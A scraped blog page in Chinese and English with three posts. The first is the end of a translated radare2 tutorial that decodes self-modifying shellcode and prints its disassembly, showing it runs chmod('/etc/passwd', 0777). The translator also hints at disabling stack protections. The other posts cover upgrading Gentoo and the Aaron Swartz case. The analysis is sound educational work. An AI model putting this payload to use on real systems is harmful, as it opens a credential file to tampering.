<p><code>ecx</code>是<code>{0x27, 0x26,...,0x1}</code>，<code>esi</code>已知。所以通过计算，需要将从<code>0x0804a058</code>开始的<code>0x27</code>字节减去<code>0x35</code>。为了模拟这个自修改代码的效果。可以使用<code>wo</code>系列命令。查看相关帮助：</p>
<pre><code>[0x080483a0]&gt; wo?
|<span class="string">Usage: wo[asmdxoArl24] [hexpairs] @ addr[:bsize]
</span>|<span class="string">Example:
</span>|<span class="string">  wox 0x90   ; xor cur block with 0x90
</span>|<span class="string">  wox 90     ; xor cur block with 0x90
</span>|<span class="string">  wox 0x0203 ; xor cur block with 0203
</span>|<span class="string">  woa 02 03  ; add [0203][0203][...] to curblk
</span>|<span class="string">  woe 02 03  
</span>|<span class="string">Supported operations:
</span>|<span class="string">  wow  ==  write looped value (alias for 'wb')
</span>|<span class="string">  woa  +=  addition
</span>|<span class="string">  wos  -=  substraction
</span>|<span class="string">  wom  *=  multiply
</span>|<span class="string">  wod  /=  divide
</span>|<span class="string">  wox  ^=  xor
</span>|<span class="string">  woo  </span>|<span class="string">=  or
</span>|<span class="string">  woA  &amp;=  and
</span>|<span class="string">  woR  random bytes (alias for 'wr $b'
</span>|<span class="string">  wor  &gt;&gt;= shift right
</span>|<span class="string">  wol  &lt;&lt;= shift left
</span>|<span class="string">  wo2  2=  2 byte endian swap
</span>|<span class="string">  wo4  4=  4 byte endian swap</span>
</code></pre><p>使用<code>wos</code>从一段内存地址中减去一个常量。但首先要打开输入输出缓存(io cache)。默认情况下radare2以只读方式打开文件，除非以<code>-w</code>标志打开。或者，设置<code>io.cache</code>为<code>true</code>，在内润中缓存写入内容。用户可随意撤销或者提交这些写入，暂不用讨论这些细节。</p>
<pre><code>[<span class="number">0x080483a0</span>]&gt; e io.cache=true
[<span class="number">0x080483a0</span>]&gt; wos <span class="number">0x35</span>@<span class="number">0x0804a058</span>:<span class="number">0x27</span>
[<span class="number">0x080483a0</span>]&gt; pDi <span class="number">30</span>@sym.shellcode 
<span class="number">0x0804a040</span>              eb11  <span class="keyword">jmp</span> <span class="number">0x804a053</span>
<span class="number">0x0804a042</span>                5e  <span class="keyword">pop</span> <span class="literal">esi</span>
<span class="number">0x0804a043</span>              31c9  <span class="keyword">xor</span> <span class="literal">ecx</span>, <span class="literal">ecx</span>
<span class="number">0x0804a045</span>              b127  <span class="keyword">mov</span> <span class="literal">cl</span>, <span class="number">0x27</span>
<span class="number">0x0804a047</span>        806c0eff35  <span class="keyword">sub</span> <span class="preprocessor">byte</span> [<span class="literal">esi</span>+<span class="literal">ecx</span>-<span class="number">0x1</span>], <span class="number">0x35</span>
<span class="number">0x0804a04c</span>            80e901  <span class="keyword">sub</span> <span class="literal">cl</span>, <span class="number">0x1</span>
<span class="number">0x0804a04f</span>              75f6  <span class="keyword">jne</span> <span class="number">0x804a047</span>
<span class="number">0x0804a051</span>              eb05  <span class="keyword">jmp</span> <span class="number">0x804a058</span>
<span class="number">0x0804a053</span>        e8eaffffff  <span class="keyword">call</span> <span class="number">0x804a042</span>
<span class="number">0x0804a058</span>              eb15  <span class="keyword">jmp</span> <span class="number">0x804a06f</span>
<span class="number">0x0804a05a</span>              31c0  <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
<span class="number">0x0804a05c</span>              b00f  <span class="keyword">mov</span> <span class="literal">al</span>, <span class="number">0xf</span>
<span class="number">0x0804a05e</span>                5b  <span class="keyword">pop</span> <span class="literal">ebx</span>
<span class="number">0x0804a05f</span>              31c9  <span class="keyword">xor</span> <span class="literal">ecx</span>, <span class="literal">ecx</span>
<span class="number">0x0804a061</span>          66b9ff01  <span class="keyword">mov</span> <span class="literal">cx</span>, <span class="number">0x1ff</span>
<span class="number">0x0804a065</span>              cd80  <span class="keyword">int</span> <span class="number">0x80</span>
<span class="number">0x0804a067</span>              31c0  <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
<span class="number">0x0804a069</span>              b001  <span class="keyword">mov</span> <span class="literal">al</span>, <span class="number">0x1</span>
<span class="number">0x0804a06b</span>              31<span class="pseudo">db</span>  <span class="keyword">xor</span> <span class="literal">ebx</span>, <span class="literal">ebx</span>
<span class="number">0x0804a06d</span>              cd80  <span class="keyword">int</span> <span class="number">0x80</span>
<span class="number">0x0804a06f</span>        e8e6ffffff  <span class="keyword">call</span> <span class="number">0x804a05a</span>
<span class="number">0x0804a074</span>                2f  <span class="keyword">das</span>
<span class="number">0x0804a075</span>            <span class="number">657463</span>  <span class="keyword">je</span> <span class="number">0x804a0db</span>
<span class="number">0x0804a078</span>                2f  <span class="keyword">das</span>
<span class="number">0x0804a079</span>              <span class="number">7061</span>  <span class="keyword">jo</span> <span class="number">0x804a0dc</span>
<span class="number">0x0804a07b</span>              <span class="number">7373</span>  <span class="keyword">jae</span> <span class="number">0x804a0f0</span>
<span class="number">0x0804a07d</span>              <span class="number">7764</span>  <span class="keyword">ja</span> <span class="number">0x804a0e3</span>
<span class="number">0x0804a07f</span>                cb  <span class="keyword">retf</span>
<span class="number">0x0804a080</span>              120e  <span class="keyword">adc</span> <span class="literal">cl</span>, [<span class="literal">esi</span>]
<span class="number">0x0804a082</span>                0e  <span class="keyword">push</span> <span class="literal">cs</span>
</code></pre><p>看到<code>0x0804a058</code>之后的指令开始有效。我先看到个<code>int 0x80</code>指令。在UNIX类系统中，<code>0x80</code>终端有特殊含义：要求内核执行系统调用，系统调用号储存在<code>eax</code>中。</p>
<p>通过人工执行(通过跳转和调用)，可得<code>eax</code>在<code>0x0804a065</code>是<code>0xf</code>，在<code>0x0804a06d</code>是<code>0x1</code>。然后google下或者随便参考下x86内核头文件就知道是哪些系统调用了。</p>
<p>可查得在<code>0x0804a065</code>调用<code>chmod</code>，接着在<code>0x0804a06d</code>调用<code>exit</code>。接着检查调用参数弄清这些调用做了什么。在linux系统中，调用参数在寄存器中(<code>ebx</code>,<code>ecx</code>,<code>edx</code>, <code>esi</code>, <code>edi</code>, <code>ebp</code>)。</p>
<p><code>chmod</code>有两个参数：分别在<code>ebx</code>和<code>ecx</code>中有指向文件路径的字符指针和模式(<code>mode_t</code>，只是一个指定想要更改成的模式或者权限的整数)。<code>ebx</code>在<code>0x0804a05e</code>从栈顶弹出，向回溯源看到栈上最顶的东西是<code>0x0804a06f</code>调用的返回地址(<code>0x0804a074</code>)。当然，这根本不是返回地址，就是一种巧妙的将字符串打包到有效载荷中的方式(shellcode动态寻址)。使用<code>ps</code>命令看看它是啥：</p>
<pre><code><span class="special">[</span>0x080483a0<span class="special">]</span>&gt; ps@0x0804a074
/etc/passwd<span class="command">\xcb</span><span class="command">\x</span>12<span class="command">\x</span>0e<span class="command">\x</span>0e<span class="command">\x</span>05<span class="command">\xeb</span><span class="command">\xf</span>3<span class="command">\x</span>1209?::<span class="command">\xeb</span><span class="command">\xff</span><span class="command">\xf</span>9<span class="command">\x</span>02<span class="command">\xf</span>9<span class="command">\xfe</span><span class="command">\xf</span>8=<span class="command">\xfc</span><span class="command">\xeb</span>;<span class="command">\xfc</span><span class="command">\xf</span>9<span class="command">\xfe</span><span class="command">\xf</span>7<span class="command">\xeb</span>;40<span class="command">\xf</span>8<span class="command">\xfb</span><span class="command">\xf</span>9
</code></pre><p><code>chmod</code>的第二个参数在<code>ecx</code>中。值是<code>0x1ff</code>，换算成八进制就是<code>0777</code></p>
<pre><code>(gdb) p/o <span class="number">0x1ff</span>
<span class="variable">$2</span> = <span class="number">0777</span>
</code></pre><p>所以调用就是<code>chmod(&#39;/etc/passwd&#39;, 0777)</code></p>
<p>之后仅仅是调用<code>exit</code>退出程序。</p>
<h2 id="总结评论">总结评论</h2><p>这里是一个在运行时动态改变自身来对抗静态分析的shellcode。该技术并不新奇，确是逃避硬编码检测的简单方法。</p>
<p>现代操作系统中这个shellcode不起作用，因为有效载荷在二进制文件的<code>.data</code>区，不可写也不可执行…………译者表示这扯远了不管它，通过使用gcc的参数<code>-fno-stack-protector execstack</code>等应该可以把这些保护关上，大概吧，记不清楚了。</p>
<p>如果想有点挑战性，试试精简过的(stripped)的二进制文件！</p>
<p>有评论告诉我。</p>
<hr>
<p>以下是译者的题外话：</p>
<p>Recent：</p>
<ul>
<li>coursera crypto-11</li>
<li>statistics for engineers and the sciences</li>
<li>coursera pred-003, I give up follow this course</li>
<li>Xie Yihui，现代统计图形</li>
<li>python for data analysis</li>
</ul>
<p>Next?: append</p>
<ul>
<li>Wikibooks:x86 assembly, <a href="http://en.wikibooks.org/wiki/X86_Disassembly" target="_blank" rel="external">http://en.wikibooks.org/wiki/X86_Disassembly</a></li>
<li>phrack radare: <a href="http://phrack.org/issues/66/14.html" target="_blank" rel="external">http://phrack.org/issues/66/14.html</a></li>
<li>crackme: <a href="http://dustri.org/b/defeating-ioli-with-radare2.html" target="_blank" rel="external">http://dustri.org/b/defeating-ioli-with-radare2.html</a></li>
</ul>
<p>Future:</p>
<p>The elements of statistical learning?</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/linux/2014/07/26/upgrade-gentoo-linux/" itemprop="url">
                  Upgrade Gentoo Linux
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-07-26T00:00:00+08:00" content="2014-07-26">
              2014-07-26
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/linux/" itemprop="url" rel="index">
                    <span itemprop="name">linux</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/linux/2014/07/26/upgrade-gentoo-linux/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="linux/2014/07/26/upgrade-gentoo-linux/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>Nowadays, I upgraded my gentoo linux.</p>
<p>I have not synchronoused the portage tree for nearly half of the year. When I came with upgrading my system, I got stuck with a lot of things I’ve never thought.</p>
<p>Luckily enough, gentoo use a mechanism to incremental upgrade. So I spent days to completely upgrade the system just with the system working properly.</p>
<p>This is a simple notes. I can’t really remember the details.</p>
<p>I’ll just write down what I learned from this lesson. To more smoothly upgrade the  system the next time.</p>
<h2 id="Upgrade_The_Stable">Upgrade The Stable</h2><h3 id="Upgrade_it">Upgrade it</h3><p>First, syncing the portage tree.</p>
<pre><code>emerge-websync
</code></pre><p>Select a good source, if you encounter with something wrong just remove the portage tree in <code>/usr/portage/</code>.</p>
<p color="red">NEVER NEVER FORGET TO READ THE NEWS</p>

<pre><code>eselect <span class="keyword">news</span> <span class="keyword">list</span>
</code></pre><p>Then, emerge the world. You can edit <code>/usr/portage/world</code> to select what you really want. I’ve play a lot of things I may never explore later, so I just edit it to minimize the time for upgrading.</p>
<p>We can emerge world now. And, preparing for struggling for hours or days…Always use <code>--with-bdeps=y</code>.</p>
<pre><code><span class="comment">emerge</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">update</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">deep</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">bdeps=y</span> <span class="comment">@world</span>
</code></pre><p>As a alternative, emerge system first.</p>
<pre><code><span class="comment">emerge</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">update</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">deep</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">bdeps=y</span> <span class="comment">system</span>
</code></pre><p>Always, there exists tons of conflicts and some other problems like licenses and so on.</p>
<p>As far as I know, one have to solve them step by step.</p>
<h3 id="Problems">Problems</h3><p>There may three major problems:</p>
<h4 id="Dependency_Conflict">Dependency Conflict</h4><p>Check if you have emerge softwares are not included in the stable portage tree. Remove it like this:</p>
<pre><code>emerge <span class="comment">--depclean google-chrome</span>
</code></pre><p>Check if you’ve masked some software. Remove them…</p>
<p>Re-emerge.</p>
<h4 id="Build_or_Configure_Error">Build or Configure Error</h4><p>Just search via google. You may re-emerge something portage won’t handle properly.</p>
<p>Sometimes, this is because you have to rebuild Perl modules.</p>
<pre><code><span class="comment">perl</span><span class="literal">-</span><span class="comment">cleaner</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">all</span> <span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">exclude=perl</span><span class="literal">-</span><span class="comment">core/Module</span><span class="literal">-</span><span class="comment">CoreList</span>
</code></pre><h4 id="New_XXX_Need_to_be_Changed_to_Proceed">New XXX Need to be Changed to Proceed</h4><p>Use <code>--auto-unmask-write</code> if you know what you are doing.</p>
<p>then:</p>
<pre><code><span class="built_in">dispatch</span>-conf
</code></pre><p>or:</p>
<pre><code>etc-<span class="keyword">update</span>
</code></pre><h2 id="Post_Upgrading">Post Upgrading</h2><p>You may want to update the overlay too.</p>
<pre><code><span class="title">layman</span> -S
</code></pre><p>Yet another emerge world(If you encounter with problems, refer to the notes above):</p>
<pre><code><span class="comment">emerge</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">update</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">deep</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">bdeps=y</span> <span class="comment">@world</span>
</code></pre><p>Remove orphaned packages.</p>
<pre><code>emerge <span class="comment">--depclean -a</span>
</code></pre><p>Check obsolete packages:</p>
<pre><code>eix-test-<span class="pragma">obsolete</span>
</code></pre><p>Update configure files:</p>
<pre><code>etc-<span class="keyword">update</span>
</code></pre><p>Rebuild broken packages:</p>
<pre><code>revdep-rebuild
</code></pre><p>Update eix databases:</p>
<pre><code>eix-<span class="keyword">update</span>
</code></pre><p>If you compile a new kernel(you do not have to), don’t forget to:</p>
<pre><code><span class="title">emerge</span> <span class="variable">@module</span>-rebuild
</code></pre><p>That’s all, hope this helps.</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/law/2014/06/13/" itemprop="url">
                  亚伦·斯沃茨一案
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-06-13T00:00:00+08:00" content="2014-06-13">
              2014-06-13
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/law/" itemprop="url" rel="index">
                    <span itemprop="name">law</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/law/2014/06/13/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="law/2014/06/13//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>Update: 看到个不错的片子，The Internet’s Own Boy: The Story Of Aaron Swartz</p>
<embed src="http://player.youku.com/player.php/sid/XNzYyMDg3MzYw/v.swf" allowfullscreen="true" quality="high" width="480" height="400" align="middle" allowscriptaccess="always" type="application/x-shockwave-flash">

<p>亚伦·斯沃茨是美国著名程序员、作家、政治活动家和互联网活动家。在其通过MIT的网络使用其拥有的哈佛研究员帐号下载大量学术论文后，被控告违反计算机欺诈和滥用法案。面对监禁，斯沃茨选择自杀。上诉随之被撤销。</p>
<h2 id="背景">背景</h2><p>2011年1月6日斯沃茨被MIT警署以其因系统下载JSTOR的学术论文涉及破坏和入侵指控逮捕。联邦检察官最终控告他两项网络诈骗和11项违反计算机欺诈和滥用法案行为。控诉累计罚款一百万美元外加35年监禁、财产没收、归还和监督保释。</p>
<p>2013年1月11日，距其被逮捕两年后，斯沃茨被发现在纽约公寓内上吊身亡。</p>
<p>JSTOR是在线数字内容提供商，提供手稿、GIS系统、扫描的植物标本和来自期刊的文章。斯沃茨是哈佛大学研究员，拥有一个JSTOR帐号。MIT开放校园访客拥有从其网络访问接入JSTOR的权利。</p>
<p>根据州和联邦政府，斯沃茨在2010年末到2011年初的几周内，通过MIT计算机网络从JSTOR下载了大量学术论文。斯沃茨通过在MIT受控接入配线间的交换机下载了大量文档到其笔记本上，而根据新闻报导，通往配线间的门是锁上的。</p>
<h2 id="逮捕、指控和起诉">逮捕、指控和起诉</h2><p>2011年1月6日，斯沃茨在哈佛校园附近被两名MIT警察和一名特勤局特工逮捕。随后在剑桥地区法院以蓄意犯下重罪破坏和入侵两项罪名提审。</p>
<p>2011年7月11日，斯沃茨在联邦地区法院被以四项重罪起诉：网络诈骗、计算机诈骗、非法从受保护计算机获取信息和不顾一切地破坏受保护计算机。</p>
<p>2011年11月17日，斯沃茨被米德尔塞克斯县高级法院大陪审团以蓄意破坏和进入、巨额盗窃和未授权接入计算机网络罪名起诉。</p>
<p>2011年12月16日，地区律师办公室发出撤回斯沃茨2011年6月被捕以来诉讼的声明。从2011年11月17日开始有关州指控的起诉于2012年3月8日取消。根据米德尔塞克斯县检察官声明州控诉取消是为了让联邦控诉顺畅进行。</p>
<p>据指此案本可以以未有任何发现毫无进展而保留判决撤回诉讼，联邦检察官的调查和介入引发了悲剧。</p>
<h2 id="联邦检察官">联邦检察官</h2><p>2011年4月13日，作为调查的一部分，联邦政府走访了斯沃茨的前伙伴连线急着奎因·诺顿。</p>
<p>2011年7月19日，7月11日起诉解封。控告斯沃茨两项欺诈和两项涉及非法介入和破坏受保护计算机罪名。根据起诉书，斯沃茨暗中将笔记本介入MIT计算机网络，运行叫做<code>keepgrabbing.py</code>的脚本，从JSTOR下载了惊人数量的文章。本案检察官说斯沃茨有将论文公开到P2P文件共享站点的意图。</p>
<p>斯沃茨向当局自首，对所有罪状供人不讳，以10万美元无抵押保释。在他被捕后，JSTOR发出声明，尽管它们认为斯沃茨的接入是以一种非授权方式的重大滥用，它们不考虑寻求对他的民事诉讼。MIT对诉讼没有评论。</p>
<p>纽约时报对案例这样描述：一个受尊敬的哈佛研究员和互联网英雄在波士顿被捕并被指控计算机黑客行为，全基于对他从有权自由获取的地方下载文章的控诉。锥子网站也类似地评论：斯沃茨被以黑客罪行指控，而不是版权侵害罪，因为其没有分发任何文档。JSTOR甚至没有想起诉他。</p>
<p>美国助理检察官斯蒂芬·海曼和斯科特·加兰德是主检察官，在美国检察官卡门·奥蒂斯的监督下工作。该案被归入计算机诈骗和滥用法案下，该法案与1986年通过以促进政府起诉非法接入计算机头去信息或破坏和摧毁计算机功能的黑客。奥蒂斯指出，如果定罪，斯沃茨将面临高达35年监禁，三年的监督保释、归还，财产没收和高达100万美元的罚款。</p>
<p>2012年9月12日，检察官提交了新的诉讼添加了九条重罪。没美国律政界普遍认为起诉过重。</p>
<h2 id="请求协商">请求协商</h2><p>斯沃茨的律师艾略特·皮特说检察官在斯沃茨死亡前两天告诉他，斯沃茨最好在监狱呆上6个月并且供认13项指控，如果他不想被审讯的话。皮特随后向司法部职业责任办公室申诉，声称如果斯沃茨不认罪，海曼威胁将寻求斯沃茨在监狱呆上七年。和皮特之前断言的联邦量刑指南中认罪部分中鼓励的相差悬殊。</p>
<p>斯沃茨最早的律师，安迪·古德告诉波士顿环球：我告诉海曼斯沃茨有自杀风险。他的反应是标准的官方反应，并不只对斯沃茨。他说，“好，我们把他关起来。”我不是说他让斯沃茨自杀，斯沃茨终将这样做。我认为它们意识到了风险但太不小心。</p>
<p>在斯沃茨死前不久，JSTOR宣称它们将免费公开4500万文章。每两周三篇文章封顶，只能在线阅读，有些可以下载。</p>
<p>在他斯沃茨死亡后，奥蒂斯办公室解除了对斯沃茨的控告。她说：引入和处理案件的官方行为是适当的，官方寻求匹配对应行为的合适量刑。一个我们推荐的最低安全环境下6个月判处。官方从来没有寻求，像斯沃茨律师所说的法律允许下的最大惩罚。</p>
<p>2013年1月12日，斯沃茨法律团队雇佣的计算机取证调查员亚历克斯·斯塔莫斯在线发表了他本该在斯沃茨审讯时提供的专家证词总结：</p>
<p>如果我如计划那样采取的立场被检察官问及亚伦的行为是“错的”，我更可能回复亚伦的行为应该被描述成欠考虑的。同样，为了历史论文检查图书馆中的每一本书也是欠考虑的，从共享Wifi下载大量文件也是欠考虑的。</p>
<h2 id="联邦控诉理由和回应">联邦控诉理由和回应</h2><p>美国检察官奥蒂斯在2011年起诉后声称：偷窃就是偷窃，无论你使用电脑命令还是撬棒，无论你偷的是文件、数据还是美元。同样损害了被害者，无论你是否出售还是赠送你偷来的东西。</p>
<h3 id="有关起诉">有关起诉</h3><p>翻译自维基百科，纪念斯沃茨。</p>
<p>被锥子网站批评：偷窃可能是偷窃，但这里什么是盗窃？很多有关该报导的推文指出了奥蒂斯评论的荒谬：“JSTOR被偷空了！”我真希望JSTOR能从它们被偷的文件中恢复。</p>
<p>2013年1月24日，纪念斯沃茨时，卡尔·马拉默德会议了它们有关PACER的工作。他指出它们将美国地区法律的上百万条记录从PACER的付费围墙后拉出，发现它们充斥着对隐私的违反。</p>
<p>“我们将结果发送给31个地区的主法官，他们删节这些记录并且对发送他们的律师大吼大叫。司法会议变更了他们的隐私条款。……对那些运行美国法院行政办公室的官僚……我们就是窃贼，所以他们呼叫FBI……FBI没有发现我们有任何不对。”</p>
<p>“司法检察官和法律部门官方过分积极的姿态，是因为他们曾经让他们尴尬过的复仇吗？还是以至少以他们的观点我们从PACER偷走了什么？JSTOR起诉的无情是当局官僚尴尬的复仇，因为让他们在纽约时报上看起来愚蠢，因为在参议院他们遇到了麻烦？”</p>
<p>前尼克松总统白宫法律顾问约翰·迪恩在justia.com写了篇题目为“以尼克松传统处理亚伦·斯沃茨问题：过分狂热和过分诉讼酿造悲剧结果”的法律文章，声称这不是些切实和公正坚持联邦法律的人，相反，他们是一群以无耻手段欺凌像亚伦·斯沃茨一样不幸的人们为乐子的独裁者。</p>
<p>乔治华盛顿大学法律教授奥林·科尔在2013年1月15日写到：这个控诉已经超过任何良心的检察官所该控诉太多。公爵大学法律教授詹姆士·博耶尔回应赫芬顿邮报：我认为科尔有关围绕慎重控诉的描述是事实，他们倾向于最小化和忽略有利斯沃茨的事实。</p>
<p>有个老记者叫Jane Scholz不认同将斯沃茨转化为面对美国政府控诉的英雄。他认为斯沃茨很熟悉信息财产保护的法律，他不应该对他自己招致的罪行有多严重吃惊。他是罪犯，不是受害者。我是个老记者，我工作时的工资来自版权，退休后的退休金来自版权。最近几年杂志社业绩不好，成千上万记者失去薪资甚至失业，我发现很讽刺的是斯沃茨还能把有版权的软件卖出去赚钱。斯沃茨事件是个悲剧，但他不是英雄。</p>
<p>法律教授麦克·麦迪逊评论道：找不到比这更巧舌如簧的话了“我的失业曾经很成功但现在不是了……”和“有些人犯罪了”由此感染了当代知识产权的议论。</p>
<p>大卫·艾伦诺维奇在时代杂志指出JSTOR本身就是慈善事业，但他不得不向学术出版商付费。他指责无法被说服的一代人认为版权还重要的“不顾一切”的行为。</p>
<p>相反，高等教育纪事报的皮特·勒德洛认为由于当前学术界发表或是灭亡的现状和杂志声誉的重要性。“当学者将将版权签给出版商之后就积累出一种一方拥有权利无法讨价还价的情况。像论文原作者一样，JSTOR也不得不在弱势上跟出版商协商许可。勒德洛展示了JSTOR和出版商的协商协议，规定出版商若销售量小于在他们旧材料最小销售时有要以补偿。而且JSTOR必须在获得JSTOR自己收益之前。”他总结道：“学术界应该团结一心，使用新的出版模式，我们必须认清亚伦·斯沃茨这样的个人不服从是合法的。”</p>
<p>Rob Weir，一个自称小杂志的助理编辑在写Inside Higher Ed道：“许多人奇怪为什么那些只聚合其他人劳动成果的人应该赚钱，特别是当很多纳税人的钱承销了许多文章。这时合法的考虑，但是斯沃茨的做法超越了法律和法理的界限。”然而他承认“JSTOR像个大爷一样向大学图书馆收费提供服务”，他认为，“即使最普通的杂志也需要高额资金生产，如果你想让任何人读你的期刊，你得给JSTOR钱或者其它聚合机构钱。除非，你能招揽一大堆广告。”他总结道：“信息想要免费”的谚语无法揭示“信息自由下隐藏的代价”，他建议“天下没有免费的午餐”还是对当前信息社会生产发展相适应的总结。他向黑客和信息窃贼告诫道：“若你无法做对的，就别犯罪”。</p>
<p>蒂姆·吴，在纽约客上写到他认为的不符的起诉。“行为本身无害，意味着没有实际的物理伤害和经济伤害。泄漏被发现和回收;JSTOR没有遭受经济损失，也没有提起诉讼。就像个恶作剧，斯沃茨的行为令受害者恼怒，但是没有持续的结果。”吴继续比较了斯沃茨的行为和乔布斯、斯蒂夫·沃兹尼亚克，“在20世纪70年代，犯下了类似罪行，但是一样没有造成经济损失。这两个人黑掉了贝尔实验室的点环系统打长途电话，还出售他们的设备赚钱。他们的老师约翰·德雷珀确实去监狱呆了一个月，但是乔布斯和沃兹尼亚克从未被起诉。相反，他们厌倦了电话黑客转而构建电脑。伟大的人总是在边缘游走。”吴写道：“我们可以根据一个社会如何对待怪人和艺术天才正确评价它，显然通过这次，我们完全失败了。”</p>
<h2 id="关于法律">关于法律</h2><p>这之后科尔在哈芬顿邮报专栏呼吁对控告斯沃茨的计算机欺诈和滥用法案改革。“斯沃茨案件的问题在于，重罪责任太容易被触发了。法律需要明确分清什么是轻罪什么是重罪，当前法律做的很差。”</p>
<p>来自美国民主自由联盟的科技政策分析师克里斯同样认为：“现存法律无法区分两类罪行的区别：为了获取利益的恶意犯罪和黑客攻入系统证明他们的技艺或者向公众散步他们认为应该公开的信息的行为。”斯坦福网络和社会中心人民自由执行官，也是斯沃茨的辩护律师珍妮佛质疑了控告斯沃茨的法律(CFAA)的适用范围。</p>
<p>法律教授斯蒂芬·卡特同意对斯沃茨的控告非常荒唐，也提出了对国会没几周就粗略炮制新类型联邦重罪的行为进行了批评。卡特认为CFAA是这个现象的一个佳例。他写道：“在20世纪80年代制定，在互联网大爆炸之前。法规让任何意图未经或超越授权接入计算机的人，在这个过程中，获取金融信息、政府信息或者任何从受保护的计算机上获取的信息，都成为罪犯。”卡特举个例子，就像你在上班，忽然想起来有个账单没付，于是登录银行支付。如果公司禁止雇员使用电脑干私人的事，你就越权了，你又登录银行获取了金融信息。相信与否，你是重罪。诉讼的可能性很小，但你还是犯罪了。卡特接着写到法律的问题是知名的，联邦法院已经给出了狭隘的司法解释。但有些人还是泛泛地理解它，并且奥巴马政府反对国会缩小其领域范围的努力。上诉法院第九轮主审亚历克斯·科金斯基警告2012年春政府的立场会让大量民众会因为微不足道的原因被怀疑犯下联邦罪名的人成为罪犯。</p>
<p>2013年，佐伊洛夫格伦和罗恩维登(两人分别是民主党前国会议员和参议员)提出一个法律建议叫做“亚伦法”，为了修订CFAA来消除之前提到的模糊性和消除是一个人对同意罪行遭受多次惩罚的冗余规定。正如连线杂志提到的，“这事实正是亚伦·斯沃茨所蒙受的，取代的起诉书超过三分之一的指控都是CFAA规定冗余带来的。”</p>
<h3 id="反应、申诉和撤诉行动">反应、申诉和撤诉行动</h3><p>在儿子的葬礼上，罗伯特·斯沃茨说：“亚伦是被政府杀害的，MIT违背了它的基本原则。”莲花公司创始人将其发布在推特上。对此，检察官卡门·奥蒂斯的丈夫，IBM执行官汤姆·多论回应说，“真他妈难以置信他自己儿子的讣告上责备他人的责任而不提我们提供了6个月监禁的选择。”马上在杂志Esquire上，查理·皮尔斯(作家)就写道，“检察官和她丈夫的狡辩仅仅在低警戒或者没有警戒的监狱，联邦监狱受折磨六个月，是我们的检察官那些日子里行事不够正常的进一步迹象。”</p>
<p>卫报联系奥蒂斯的发言人，发言人称对此事不置评论。路透社报导无法联系上其丈夫多伦。在2013年1月16日，奥蒂斯发布了官方声明，她重申了“我必须阐明官方在引入和处理此案的行为是合理的。”并且她的下属在“坚守誓言执行法律时肩负着困难的任务，但他们做了合理的事。”</p>
<p>2013年1月28日，斯沃茨的房产律师想司法部控诉助理检察官斯蒂芬·海曼职业行为不当。他们说海曼“向法庭有关联邦政府摄入调查的程度和范围进行了不实汇报。”</p>
<p>“邮件和报导更一步显示……海曼自身涉入了调查，甚至在斯沃茨一月6号被捕之前。”</p>
<p>律师们认为海曼当他强迫斯沃茨认罪时滥用了他的酌处权：</p>
<p>“斯沃茨……自然感觉放弃他的权利备受压力……四个月和相差七年的差距太大……对被告的量刑应该遵循量刑指南中承担责任条款要求”(认罪减免两到三级罪行。)</p>
<p>3月15日，律师要求联邦法院更改斯沃茨文件的保护令允许公开披露发现的材料，包括MIT，JSTOR中人员和法律部门雇员的姓名和头衔。律师们声称保留姓名让文档不易被国会更好理解和使用。马州首席助理检察官表示他在积极残余讨论，并将询问法庭给受影响雇员一个对建议的披露被聆听机会。</p>
<p>司法部寻求编撰涉案检察官的姓名。在2013年4月3日，美国联邦检察官办公室发言人说，“我们反对公开的原因在于，涉案人员不仅会受到影响，有时还受到残余影响”。联邦检察官办公室报告了数起针对已知涉案检察官的威胁和骇客尝试：“奥蒂斯和海曼受到威胁邮件，对海曼facebook帐号的骇客，海曼哈佛大学教授的父亲收到其在断头台的照片。”明信片和一些邮件摘录被连线杂志发布。</p>
